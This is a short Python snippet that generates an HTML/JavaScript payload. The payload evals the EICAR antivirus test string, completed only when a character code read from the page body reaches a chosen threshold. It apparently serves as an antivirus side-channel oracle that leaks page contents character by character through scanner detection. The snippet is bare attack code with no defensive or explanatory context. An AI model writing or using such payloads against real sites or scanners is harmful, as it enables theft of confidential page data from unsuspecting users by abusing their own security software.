def trigger(c, idx):
    import string
    p = '''<script>f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));</script><body>'''
    p = string.Template(p).substitute({'idx': idx, 'c': c})
    return p

print(trigger(128, 0))